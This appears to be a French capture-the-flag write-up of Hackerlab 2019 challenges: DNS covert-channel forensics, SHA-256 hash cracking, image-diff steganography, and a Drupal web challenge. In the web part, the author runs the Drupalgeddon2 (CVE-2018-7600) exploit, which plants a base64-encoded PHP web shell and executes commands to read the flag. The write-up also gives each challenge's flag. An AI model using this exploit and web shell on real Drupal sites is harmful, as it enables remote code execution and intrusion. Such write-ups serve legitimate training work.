

* * * * *

                        Covert Channel - Forensic

* * * * *

Enoncé: Le gayeman DJAKPAGLO est maintenant aux mains de l'OCRC. Mais Il semble que DJAKPATAGLO ait des espions au sein du bjCSIRT. Ces derniers arrivent à contourner les mesures de sécurité mises en place pour exfiltrer des données vers leur chef en prison. Le SOC du bjCSIRT a répéré cela à travers une capture réseau, qu'il vous envoie pour analyse.

Le but est d'analyser la capture réseau.

En analysant la capture réseau, nous sommes tombé sur des paquets DNS contenant apparemment des hashs suivies de ".cyber.hackirlab.local" ce qui attire notre attention. Nous allons les extraires:

\$ tshark -r capture.pcap -Y dns 2793 86.754401 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0xfe9c A 4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f.cyber.hackirlab.local OPT 2794 86.754679 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0xfe9c No such name A 4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2795 86.810865 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x1210 A 6e73656374657475722061646970697363696e6720656c69742c20736564.cyber.hackirlab.local OPT 2796 86.811106 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x1210 No such name A 6e73656374657475722061646970697363696e6720656c69742c20736564.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2797 86.849345 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x1ef1 A 20646f20656975736d6f642074656d706f7220696e6369646964756e7420.cyber.hackirlab.local OPT 2798 86.849595 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x1ef1 No such name A 20646f20656975736d6f642074656d706f7220696e6369646964756e7420.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2799 86.880560 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x0a85 A 7574206c61626f726520657420646f6c6f7265206d61676e6120616c6971.cyber.hackirlab.local OPT 2800 86.880743 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x0a85 No such name A 7574206c61626f726520657420646f6c6f7265206d61676e6120616c6971.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2801 86.911281 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x9521 A 75612e20557420656e696d206164206d696e696d2076656e69616d2c2071.cyber.hackirlab.local OPT 2802 86.911499 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x9521 No such name A 75612e20557420656e696d206164206d696e696d2076656e69616d2c2071.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT ............................................................................... ................................................................................... .................................................................................. .......................................................................... 2819 87.210762 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x9bc9 A 6f6e2070726f6964656e742c2073756e7420696e2063756c706120717569.cyber.hackirlab.local OPT 2820 87.210958 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x9bc9 No such name A 6f6e2070726f6964656e742c2073756e7420696e2063756c706120717569.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2821 87.253293 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x2f0d A 206f666669636961206465736572756e74206d6f6c6c697420616e696d20.cyber.hackirlab.local OPT 2822 87.253507 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x2f0d No such name A 206f666669636961206465736572756e74206d6f6c6c697420616e696d20.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2823 87.280760 192.168.56.101 → 192.168.56.110 DNS 135 Standard query 0x2655 A 696420657374206c61626f72756d0a.cyber.hackirlab.local OPT 2824 87.280966 192.168.56.110 → 192.168.56.101 DNS 205 Standard query response 0x2655 No such name A 696420657374206c61626f72756d0a.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT

Maintenant nous allons essayer de decoder tous les hashs extraits.






* * * * *

                                   Bad practice

* * * * *

Enoncé: En respectant les règles d'hygienes informatique, on ne devrait pas être amenés à faire ca 9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5 Précédez la réponse de CTF\_

Le but ici est de decoder le possible hash donné :9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5 Ensuite il faudra préceder le result de CTF\_ Essayons d'identifier le type du hash avec l'outil hash-identifier:

\$ hash-identifier \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\# \# \_\_ \_\_ \_\_ \_\_\_\_\_\_ \_\_\_\_\_ \# \# / /   /   /\_\_ *  /  * `\         #    #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #    #     \ \  _  \  /'__`  / ,**    \_ `\      \ \ \   \ \ \ \ \       #    #      \ \ \ \ \/\ \_\ \_/\__,`       \_ \_\_   \_   \# \#  \_ \_ \_** \_/\_***/  \_ \_  /\_****  \_***/ \# \# /*//*//**//*//***/ /*//*/ /*/ /***/ v1.2 \# \# By Zion3R \# \# www.Blackploit.com \# \# Root@Blackploit.com \# \#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\# -------------------------------------------------- HASH: 9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5

Possible Hashs: [+] SHA-256 [+] Haval-256

Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5(\(pass)) [+] SHA-256(sha1(\)pass)) --------------------------------------------------

Nous avons donc affaire à un hash de type SHA-256. Essayons maintenant de le decoder avec CrackStation: https://crackstation.net/ Le hash est décodé:

9ed6c336c58699768ee0ff4782532203a06f541aec022015d8fa4b23813a36d5 sha256 rasdzv3

Le flag est donc CTF\_rasdzv3 Mission accomplie.

* * * * *

                        Amazones jumelles - Stéganographie

* * * * *

Enoncé: La puissance des jumelles, c'est qu'elles vont toujours de pair. C'était pareil pour les amazones.

Sur cette épreuve nous avons téléchargé deux images en format png. L'une cachant le flag. Nous allons donc comparer les deux images afin de faire ressortir le flag. Pour ce faire nous allons utiliser un outil en ligne qui nous permettra d'y arriver: https://futureboy.us/stegano/ https://futureboy.us/stegano/compinput.html

Après comparaison nous téléchageons la différence entre les deux images et nous pouvons voir le flag:

CTF\_XOR\_FDFGDGDFGE

* * * * *

                          Armageddon (End Game) - Web

* * * * *

Enoncé: Votre unité de cyber-amazones est envoyée pour défendre le pays contre l'Armageddon invoqué par DJAKPATAGLO. C'est le clap de fin du \#Hackerlab2019.

http://qualif.hackerlab.bj:8082

Après ouverture du lien dans un nouvel onglet, nous sommmes tombé sur un site conçu avec Drupal avec le message d'acceuil:

"Bienvenue sur Armagueddon Aucun contenu de page d'accueil n'a été créé pour l'instant. Suivre le Guide utilisateur pour démarrer la construction de votre site. " En allant sur le guide utilisateur à l'adresse: https://www.drupal.org/fr/docs/user\_guide/fr/index.html Nous avons su que le site a été conçu avec la version 8 de Drupal. Essayons de trouver de potentielle failles de securité et vulnérabilité.

Après une petite recherche d'exploit, nous sommes tombé sur l'exploit appelé Drupalgeddon2: CVE-2018-7600 Drupal \< 8.3.9 / \< 8.4.6 / \< 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit) codé en ruby. Nous allons l'utiliser sur le site: \$ ruby drupalgeddon2.rb http://qualif.hackerlab.bj:8082 [\*] --==[::\#Drupalggedon2::]==-- -------------------------------------------------------------------------------- [i] Target : http://qualif.hackerlab.bj:8082/ -------------------------------------------------------------------------------- [+] Header : v8 [X-Generator][!] MISSING: http://qualif.hackerlab.bj:8082/CHANGELOG.txt (HTTP Response: 404) [+] Found : http://qualif.hackerlab.bj:8082/core/CHANGELOG.txt (HTTP Response: 200) [!] MISSING: http://qualif.hackerlab.bj:8082/core/CHANGELOG.txt (HTTP Response: 200) [+] Header : v8 [X-Generator][!] MISSING: http://qualif.hackerlab.bj:8082/includes/bootstrap.inc (HTTP Response: 404) [!] MISSING: http://qualif.hackerlab.bj:8082/core/includes/bootstrap.inc (HTTP Response: 403) [!] MISSING: http://qualif.hackerlab.bj:8082/includes/database.inc (HTTP Response: 404) [+] Found : http://qualif.hackerlab.bj:8082/ (HTTP Response: 200) [+] Metatag: v8.x [Generator][!] MISSING: http://qualif.hackerlab.bj:8082/ (HTTP Response: 200) [+] Drupal?: v8.x -------------------------------------------------------------------------------- [\*] Testing: Form (user/register) [+] Result : Form valid - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [\*] Testing: Clean URLs [+] Result : Clean URLs enabled -------------------------------------------------------------------------------- [\*] Testing: Code Execution (Method: mail) [i] Payload: echo VFCGWFFM [+] Result : VFCGWFFM [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO! -------------------------------------------------------------------------------- [\*] Testing: Existing file (http://qualif.hackerlab.bj:8082/shell.php) [!] Response: HTTP 200 // Size: 6. ***Something could already be there?*** - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [\*] Testing: Writing To Web Root (./) [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!! -------------------------------------------------------------------------------- [i] Fake PHP shell: curl 'http://qualif.hackerlab.bj:8082/shell.php' -d 'c=hostname' 97c08f3b7cc3\>\>

* * * * *

Là nous venons d'obtenir un shell. Essayons de rechercher le flag en listant le contenu du répertoire courant:

97c08f3b7cc3\>\> ls LICENSE.txt README.txt autoload.php composer.json composer.lock core example.gitignore flag.txt hello.txt index.php modules profiles robots.txt shell.php sites themes update.php vendor web.config 97c08f3b7cc3\>\>

On peut remarquer la présence d'un fichier flag.txt, lisons son contenu:

97c08f3b7cc3\>\> cat flag.txt CTF\_CyberAmazonWinArmagedon 97c08f3b7cc3\>\>

Bingo le flag pour cette épreuve est donc: CTF\_CyberAmazonWinArmagedon

* * * * *

* * * * *
